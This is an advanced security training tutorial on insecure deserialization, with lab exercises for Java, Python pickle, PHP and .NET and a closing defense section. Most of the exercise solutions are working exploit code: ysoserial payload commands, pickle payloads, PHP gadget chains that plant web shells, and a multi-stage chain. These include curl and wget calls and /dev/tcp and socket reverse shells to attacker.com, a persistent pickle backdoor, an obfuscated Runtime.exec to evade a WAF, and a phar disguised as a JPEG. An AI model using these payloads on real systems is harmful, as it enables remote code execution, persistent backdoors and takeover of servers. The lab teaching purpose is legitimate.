# 🔄 Insecure Deserialization Tutorial

**Difficulty**: ⭐⭐⭐⭐⭐ (Advanced)  
**Time Required**: 3 hours  
**Applications**: Java Deserialization Lab, Python Pickle Lab, .NET apps

## 📚 Table of Contents
1. [What is Deserialization?](#what-is-deserialization)
2. [How Deserialization Attacks Work](#how-deserialization-attacks-work)
3. [Language-Specific Vulnerabilities](#language-specific-vulnerabilities)
4. [Hands-On Practice](#hands-on-practice)
5. [Defense Strategies](#defense-strategies)
6. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand serialization/deserialization concepts
- ✅ Identify deserialization vulnerabilities
- ✅ Exploit Java, Python, PHP, and .NET deserialization
- ✅ Create custom gadget chains
- ✅ Implement secure deserialization practices

---

## What is Deserialization?

Serialization converts objects into a format that can be stored or transmitted. Deserialization reverses this process. When applications deserialize untrusted data without validation, attackers can execute arbitrary code.

### 🎬 Real-World Impact

Major deserialization attacks:
- **Equifax (2017)**: Apache Struts deserialization led to 147M records breach
- **PayPal (2016)**: Java deserialization RCE - $30,000 bounty
- **Jenkins (2015-2017)**: Multiple RCE vulnerabilities
- **Oracle WebLogic**: Repeated critical vulnerabilities

### 🔍 Where Deserialization Occurs

- 🍪 Session cookies (base64 encoded objects)
- 📨 Message queues (RabbitMQ, Kafka)
- 🔌 RPC/API calls
- 💾 Cache systems (Redis, Memcached)
- 🗄️ Database blobs

---

## How Deserialization Attacks Work

### The Attack Process

1. **Application** accepts serialized data
2. **Deserialization** triggers object creation
3. **Magic methods** execute automatically
4. **Gadget chain** leads to code execution

### Magic Methods by Language

**Java**: 
- `readObject()`, `readResolve()`, `finalize()`

**Python**:
- `__reduce__()`, `__setstate__()`, `__getattr__()`

**PHP**:
- `__wakeup()`, `__destruct()`, `__toString()`

**.NET**:
- `OnDeserialization()`, custom serialization constructors

---

## Language-Specific Vulnerabilities

### Java Serialization

**Format**: Starts with `AC ED 00 05` (hex) or `rO0AB` (base64)

**Common Libraries with Gadgets**:
- Commons Collections
- Spring Framework
- Groovy
- Commons BeanUtils

### Python Pickle

**Format**: Protocol markers like `\x80\x03` or `(dp0`

**Dangerous Functions**:
- `pickle.loads()`
- `yaml.load()` (without SafeLoader)
- `jsonpickle.decode()`

### PHP Serialization

**Format**: `a:1:{s:4:"name";s:5:"admin";}`

**Vulnerable Functions**:
- `unserialize()`
- `phar://` wrapper

### .NET Serialization

**Format**: Often base64 with type information

**Vulnerable Formatters**:
- BinaryFormatter
- SoapFormatter
- NetDataContractSerializer

---

## Hands-On Practice

### 🏃 Exercise 1: Java Deserialization with ysoserial

**Setup**: Java application accepting serialized input  
**Goal**: Achieve RCE using Commons Collections gadget

<details>
<summary>💡 Hint 1: Identify serialization</summary>

Look for:
- Base64 that starts with `rO0AB`
- Hex starting with `AC ED 00 05`
- Content-Type: `application/x-java-serialized-object`

Decode and check for Java class names.

</details>

<details>
<summary>💡 Hint 2: Generate payload</summary>

ysoserial is your friend:
```bash
java -jar ysoserial.jar CommonsCollections5 "command" | base64
```

But which gadget works? Try them all!

</details>

<details>
<summary>💡 Hint 3: Deliver the payload</summary>

Common delivery methods:
- Replace cookie value
- POST body
- Custom headers
- WebSocket messages

</details>

<details>
<summary>🔓 Solution</summary>

**Step 1**: Detect serialization point
```python
import base64
import requests

# Check cookies
cookies = session.cookies
for name, value in cookies.items():
    try:
        decoded = base64.b64decode(value)
        if decoded.startswith(b'\xac\xed\x00\x05'):
            print(f"Java serialization in cookie: {name}")
    except:
        pass
```

**Step 2**: Generate payloads
```bash
# Try different gadgets
for gadget in CommonsCollections1 CommonsCollections5 Spring1 Groovy1; do
    java -jar ysoserial.jar $gadget "curl http://attacker.com/$gadget" > $gadget.ser
done

# Or use command execution
java -jar ysoserial.jar CommonsCollections5 "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | base64 -w0
```

**Step 3**: Send payload
```python
# Replace cookie
payload = base64.b64encode(open('payload.ser', 'rb').read()).decode()
cookies['session'] = payload
response = requests.get(url, cookies=cookies)

# Or in body
response = requests.post(url, 
    data=open('payload.ser', 'rb').read(),
    headers={'Content-Type': 'application/x-java-serialized-object'}
)
```

**Step 4**: Custom gadget chain
```java
// If standard gadgets don't work, create custom
public class CustomGadget implements Serializable {
    private void readObject(ObjectInputStream ois) throws Exception {
        ois.defaultReadObject();
        Runtime.getRuntime().exec("calc");
    }
}
```

</details>

---

### 🏃 Exercise 2: Python Pickle Exploitation

**Setup**: Python app using pickle for session storage  
**Goal**: Execute arbitrary Python code

<details>
<summary>💡 Hint 1: Understand pickle opcodes</summary>

Pickle uses a stack-based VM. Key opcodes:
- `c`: Import module
- `(`: Mark object
- `S`: String
- `R`: Reduce (call function)

Can you craft these manually?

</details>

<details>
<summary>💡 Hint 2: Use __reduce__</summary>

The `__reduce__` method controls pickling:
```python
def __reduce__(self):
    return (os.system, ('command',))
```

</details>

<details>
<summary>💡 Hint 3: Bypass restrictions</summary>

If certain modules are blocked:
- Use builtins: `__builtins__`
- Import indirectly: `__import__`
- Use eval/exec

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: Basic pickle exploit**
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        # Simple command execution
        return (os.system, ('curl http://attacker.com/pwned',))

# Generate payload
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(f"Payload: {payload}")

# Test locally
pickle.loads(base64.b64decode(payload))
```

**Method 2: Manual opcode construction**
```python
# Build pickle bytecode manually
opcode = b"""cos
system
(S'curl http://attacker.com/pwned'
tR."""

payload = base64.b64encode(opcode).decode()
```

**Method 3: Advanced payload with imports**
```python
class AdvancedExploit:
    def __reduce__(self):
        # Import and execute
        return (
            __builtins__.__getattribute__('__import__')('os').system,
            ('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',)
        )

# Or using eval
class EvalExploit:
    def __reduce__(self):
        return (
            eval,
            ("__import__('os').system('id > /tmp/pwned')",)
        )
```

**Method 4: Bypass restricted unpickler**
```python
# If RestrictedUnpickler is used
class BypassExploit:
    def __reduce__(self):
        # Use allowed modules creatively
        return (
            __builtins__.__dict__['__import__'],
            ('subprocess',)
        )
    
    def __getattr__(self, name):
        # Triggered during unpickling
        import subprocess
        subprocess.call(['curl', 'http://attacker.com/pwned'])
```

**Delivery example**:
```python
import requests

# In cookie
cookies = {
    'session': base64.b64encode(pickle.dumps(Exploit())).decode()
}
requests.get(url, cookies=cookies)

# In form data
data = {
    'data': base64.b64encode(pickle.dumps(Exploit())).decode()
}
requests.post(url, data=data)
```

</details>

---

### 🏃 Exercise 3: PHP Object Injection

**Setup**: PHP application with `unserialize()` on user input  
**Goal**: Exploit magic methods for RCE

<details>
<summary>💡 Hint 1: Find the entry point</summary>

Look for:
- `unserialize($_COOKIE[...])`
- `unserialize(base64_decode(...))`
- Serialized data in URLs/forms

PHP format: `O:4:"User":1:{s:4:"name";s:5:"admin";}`

</details>

<details>
<summary>💡 Hint 2: Identify useful classes</summary>

You need classes with exploitable magic methods:
- `__wakeup()`: Called on unserialize
- `__destruct()`: Called when object is destroyed
- `__toString()`: Called when treated as string

Find the application's classes!

</details>

<details>
<summary>💡 Hint 3: Build gadget chain</summary>

Chain methods together:
1. Entry point triggers `__wakeup()`
2. Which calls vulnerable method
3. Leading to file write/command execution

</details>

<details>
<summary>🔓 Solution</summary>

**Step 1**: Identify vulnerable code
```php
// Vulnerable class example
class Logger {
    public $logFile;
    public $logData;
    
    function __destruct() {
        file_put_contents($this->logFile, $this->logData);
    }
}

// Usage
$data = unserialize($_COOKIE['data']);
```

**Step 2**: Create exploit**
```php
<?php
class Logger {
    public $logFile = '/var/www/html/shell.php';
    public $logData = '<?php system($_GET["cmd"]); ?>';
}

$exploit = new Logger();
$serialized = serialize($exploit);
echo base64_encode($serialized);
// Result: TzoxMDoiTG9nZ2VyIjoyOntzOjc6ImxvZ0ZpbGUiO3M6MjQ6Ii92YXIvd3d3L2h0bWwvc2hlbGwucGhwIjtzOjc6ImxvZ0RhdGEiO3M6MzE6Ijw/cGhwIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/PiI7fQ==
?>
```

**Step 3**: Advanced gadget chain**
```php
<?php
// If direct RCE isn't available, chain gadgets
class CacheManager {
    public $cache;
    function __destruct() {
        $this->cache->save();
    }
}

class FileCache {
    public $file;
    public $data;
    function save() {
        file_put_contents($this->file, $this->data);
    }
}

// Build chain
$file_cache = new FileCache();
$file_cache->file = '/var/www/html/backdoor.php';
$file_cache->data = '<?php eval($_POST["cmd"]); ?>';

$cache_manager = new CacheManager();
$cache_manager->cache = $file_cache;

echo base64_encode(serialize($cache_manager));
?>
```

**Step 4**: Phar deserialization**
```php
// Create malicious phar
<?php
class Evil {
    function __destruct() {
        system('curl http://attacker.com/pwned');
    }
}

@unlink("exploit.phar");
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new Evil());
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();

// Rename to bypass extension checks
rename("exploit.phar", "exploit.jpg");
?>

// Trigger with phar://
// file_exists("phar://./uploads/exploit.jpg/test.txt")
```

</details>

---

### 🏃 Exercise 4: .NET Deserialization

**Setup**: .NET application using BinaryFormatter  
**Goal**: Exploit TypeConfuseDelegate gadget

<details>
<summary>💡 Hint 1: Identify .NET serialization</summary>

Look for:
- Base64 with "AAEAAAD/////" prefix
- ViewState parameters
- .NET remoting endpoints

</details>

<details>
<summary>💡 Hint 2: Use ysoserial.net</summary>

Similar to Java version:
```
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"
```

</details>

<details>
<summary>💡 Hint 3: ViewState exploitation</summary>

If ViewState is used:
- Need MachineKey or signing disabled
- Use `-g ViewState` in ysoserial.net

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: Basic BinaryFormatter**
```csharp
// Vulnerable code
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);

// Generate payload
// ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c curl http://attacker.com" -o base64
```

**Method 2: ViewState exploitation**
```bash
# With known MachineKey
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0AIgAsADQANAA0ADQAKQA=" --validationalg="HMACSHA256" --validationkey="[KEY]" --generator="[GENERATOR]"

# Without MAC validation
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "calc" --islegacy --isdebug
```

**Method 3: JSON.NET exploitation**
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib",
        "$values": ["calc"]
    },
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    }
}
```

**Method 4: Custom gadget**
```csharp
[Serializable]
public class CustomGadget : ISerializable {
    public CustomGadget() { }
    
    protected CustomGadget(SerializationInfo info, StreamingContext context) {
        // Executes during deserialization
        System.Diagnostics.Process.Start("calc.exe");
    }
    
    public void GetObjectData(SerializationInfo info, StreamingContext context) {
        // Required for ISerializable
    }
}
```

</details>

---

### 🏃 Challenge: Multi-Stage Deserialization

**Goal**: Chain multiple deserialization vulnerabilities

<details>
<summary>🎯 Challenge Overview</summary>

Real-world scenarios often require:
1. Bypass WAF/filters
2. Escape sandboxes
3. Work with limited gadgets
4. Achieve persistence

</details>

<details>
<summary>💡 Hint: Polyglot payloads</summary>

Create payloads that work in multiple contexts:
- Valid in multiple serialization formats
- Bypass different filters
- Work across languages

</details>

<details>
<summary>🔓 Solution</summary>

**Stage 1: Initial foothold via filtered Java deserialization**
```java
// WAF blocks Runtime.exec, use reflection
class Stage1 implements Serializable {
    private void readObject(ObjectInputStream in) throws Exception {
        in.defaultReadObject();
        
        // Obfuscated Runtime.exec
        String className = new String(new byte[]{106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101});
        String methodName = new String(new byte[]{101,120,101,99});
        
        Class.forName(className)
            .getMethod("getRuntime")
            .invoke(null)
            .getClass()
            .getMethod(methodName, String.class)
            .invoke(Class.forName(className).getMethod("getRuntime").invoke(null), 
                    "wget http://attacker.com/stage2.py -O /tmp/s.py");
    }
}
```

**Stage 2: Python persistence via pickle**
```python
# stage2.py - Downloaded and executed
import subprocess
import base64
import pickle

# Create persistent backdoor
backdoor = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""

# Hide in legitimate pickle
class LegitData:
    def __init__(self):
        self.data = "normal data"
    
    def __reduce__(self):
        return (exec, (backdoor,))

# Save to cache/session
with open('/tmp/cache.pkl', 'wb') as f:
    pickle.dump(LegitData(), f)
```

**Stage 3: Cross-language exploitation**
```php
// PHP component reads Python pickle (some apps do this!)
<?php
$data = file_get_contents('/tmp/cache.pkl');
// Custom pickle parser triggers Python execution
exec("python3 -c \"import pickle; pickle.loads(b'" . base64_encode($data) . "')\"");
?>
```

**Universal polyglot payload**:
```python
# Works in multiple contexts
payload = """
#<?php system($_GET[0]); __halt_compiler();
#*/
__import__('os').system('id')
#"""

# Can be injected as:
# - Python comment (ignored by PHP)
# - PHP code (ignored by Python)
# - Both execute in their respective contexts
```

</details>

---

## Defense Strategies

### 🛡️ Secure Deserialization Practices

**1. Avoid Native Serialization**
```python
# BAD
data = pickle.loads(user_input)

# GOOD - Use JSON
data = json.loads(user_input)
```

**2. Type Validation**
```java
// Java - Use whitelist
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "java.lang.*;java.util.*;!*"
);
```

**3. Signing & Encryption**
```python
import hmac
import hashlib

def secure_serialize(obj, secret_key):
    data = pickle.dumps(obj)
    signature = hmac.new(secret_key, data, hashlib.sha256).digest()
    return signature + data

def secure_deserialize(signed_data, secret_key):
    signature = signed_data[:32]
    data = signed_data[32:]
    expected = hmac.new(secret_key, data, hashlib.sha256).digest()
    
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Invalid signature")
    
    return pickle.loads(data)
```

**4. Isolation & Sandboxing**
```python
# Run deserialization in restricted environment
import subprocess
import json

def safe_deserialize(data):
    # Deserialize in subprocess with limited permissions
    result = subprocess.run(
        ['python3', '-m', 'restricted_deserializer'],
        input=data,
        capture_output=True,
        timeout=5
    )
    return json.loads(result.stdout)
```

### 🛡️ Language-Specific Defenses

**Java**:
- Use `ObjectInputFilter` (Java 9+)
- Prefer JSON/XML over native serialization
- Remove gadget libraries from classpath

**Python**:
- Never use `pickle` for untrusted data
- Use `json` or `msgpack` instead
- If pickle required, use `RestrictedUnpickler`

**PHP**:
- Avoid `unserialize()` on user input
- Use JSON instead
- Implement `__wakeup()` and `__sleep()` carefully

**.NET**:
- Never use `BinaryFormatter`
- Use `DataContractSerializer` with known types
- Validate ViewState properly

---

## 📊 Quick Reference

### Detection Patterns

| Language | Binary Signature | Base64 Prefix | Text Format |
|----------|-----------------|---------------|-------------|
| Java | `AC ED 00 05` | `rO0AB` | N/A |
| Python | `\x80\x03` | `gAM` | `(dp0` |
| PHP | N/A | N/A | `a:1:{s:4:` |
| .NET | `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | N/A |

### Exploitation Tools

- **Java**: ysoserial, marshalsec, SerialKiller
- **Python**: pickle-payload, pythonpickle
- **.NET**: ysoserial.net, ExploitRemotingService
- **PHP**: phpggc, PHPGGC

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Identify serialization formats
- [ ] Generate payloads with ysoserial
- [ ] Exploit Python pickle
- [ ] Create PHP gadget chains
- [ ] Bypass deserialization filters
- [ ] Implement secure alternatives

---

## Additional Resources

### 🔧 Tools
- **ysoserial**: Java deserialization payloads
- **ysoserial.net**: .NET deserialization payloads
- **phpggc**: PHP gadget chains
- **marshalsec**: Java marshalling payloads

### 📖 Further Reading
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [Java Deserialization: A Journey](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
- [Exploiting Deserialization Vulnerabilities](https://portswigger.net/web-security/deserialization)

### 🎥 Video Resources
- [LiveOverflow - PHP Object Injection](https://www.youtube.com/watch?v=HaW15aMzBUM)
- [IppSec - Deserialization Attacks](https://www.youtube.com/watch?v=t-zVC-CxYjw)

---

**Next Tutorial**: [GraphQL Security](graphql.md) → 